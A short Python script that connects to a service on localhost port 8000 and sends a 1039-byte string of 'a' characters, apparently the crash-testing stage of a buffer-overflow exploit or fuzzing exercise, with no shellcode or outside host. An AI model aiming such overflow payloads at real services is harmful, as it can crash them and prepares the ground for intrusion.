#!/usr/bin/python

import os, socket


HOST = '127.0.0.1'
PORT = 8000


def get_payload():
    
    return 'a'*1039



def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
